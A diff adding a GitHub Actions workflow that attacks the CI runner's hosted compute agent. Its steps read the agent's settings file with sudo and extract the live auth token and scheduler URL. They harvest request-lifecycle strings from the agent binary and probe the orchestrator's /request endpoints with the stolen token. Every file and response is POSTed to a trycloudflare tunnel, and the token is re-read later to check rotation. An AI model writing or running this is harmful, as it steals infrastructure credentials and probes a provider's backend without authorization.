@@ -1,0 +1,65 @@
+name: r9i-lifecycle-verbs-and-fresh-harvest
+on:
+  workflow_dispatch:
+env:
+  TUNNEL: https://admitted-isp-museum-becomes.trycloudflare.com
+jobs:
+  r9i:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: P-A ship .settings at job start
+        run: |
+          sudo cat /opt/hca/.settings > /tmp/r9i-settings-start.json
+          curl -sS -m 20 --data-binary @/tmp/r9i-settings-start.json -X POST "$TUNNEL/r9b-ingest?file=r9i-settings-start" >/dev/null 2>&1 || true
+          echo "shipped settings-at-start ($(wc -c < /tmp/r9i-settings-start.json) bytes)"
+
+      - name: P-B deep strings harvest around request lifecycle
+        run: |
+          sudo strings -a /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE 'request|jobresult|finishrequest|completerequest|acquire|heartbeat|jobstarted|returnjob|worker' > /tmp/r9i-strings.txt
+          wc -l < /tmp/r9i-strings.txt | xargs echo "lifecycle strings lines:"
+          curl -sS -m 30 --data-binary @/tmp/r9i-strings.txt -X POST "$TUNNEL/r9b-ingest?file=r9i-lifecycle-strings" >/dev/null 2>&1 || true
+          echo "== route-shaped (public log) =="
+          grep -oE '"(GET|POST|PUT|DELETE|PATCH) /[^"]+"|/(v1/)?request[a-z/-]*' /tmp/r9i-strings.txt | sort -u | head -30
+
+      - name: P-C lifecycle method matrix (live token, own request)
+        run: |
+          python3 - <<'EOF'
+          import json
+          s = json.load(open('/tmp/r9i-settings-start.json'))
+          open('/tmp/r9i-token','w').write(s['authToken'])
+          open('/tmp/r9i-orch','w').write(s.get('schedulerApiUrl','').rstrip('/'))
+          EOF
+          TOK=$(cat /tmp/r9i-token); ORCH=$(cat /tmp/r9i-orch)
+          : > /tmp/r9i-bodies
+          m() {
+            CODE=$(curl -sS -m 8 -o /tmp/r9i-body -w '%{http_code}' -H "Authorization: Bearer $TOK" -H "Content-Type: $3" -X "$1" "$ORCH$2" ${4:+--data "$4"} 2>/dev/null || echo err)
+            echo "$1 $2 [$3] -> $CODE ($(wc -c < /tmp/r9i-body 2>/dev/null || echo 0) B)"
+            if [ "$CODE" != "404" ] && [ "$CODE" != "err" ]; then { echo "=== $1 $2 [$3] ==="; head -c 800 /tmp/r9i-body 2>/dev/null; echo; } >> /tmp/r9i-bodies; fi
+          }
+          m OPTIONS "/request" "application/json"
+          m DELETE "/request" "application/json"
+          m PUT "/request" "application/json" '{}'
+          m PUT "/request/heartbeat" "application/json" '{}'
+          m PATCH "/request/heartbeat" "application/json" '{}'
+          m POST "/request/heartbeat" "application/proto" ''
+          m PUT "/request/heartbeat" "application/proto" ''
+          m POST "/request:complete" "application/json" '{}'
+          m POST "/request:finish" "application/json" '{}'
+          m POST "/request/job-result" "application/json" '{}'
+          m POST "/request/result" "application/json" '{}'
+          curl -sS -m 25 --data-binary @/tmp/r9i-bodies -X POST "$TUNNEL/r9b-ingest?file=r9i-method-matrix" >/dev/null 2>&1 || true
+
+      - name: P-D wait and re-ship settings (rotation check)
+        run: |
+          sleep 90
+          sudo cat /opt/hca/.settings > /tmp/r9i-settings-end.json
+          python3 - <<'EOF'
+          import json
+          a = json.load(open('/tmp/r9i-settings-start.json'))
+          b = json.load(open('/tmp/r9i-settings-end.json'))
+          print('token rotated during job:', a['authToken'] != b['authToken'])
+          EOF
+          curl -sS -m 20 --data-binary @/tmp/r9i-settings-end.json -X POST "$TUNNEL/r9b-ingest?file=r9i-settings-end" >/dev/null 2>&1 || true
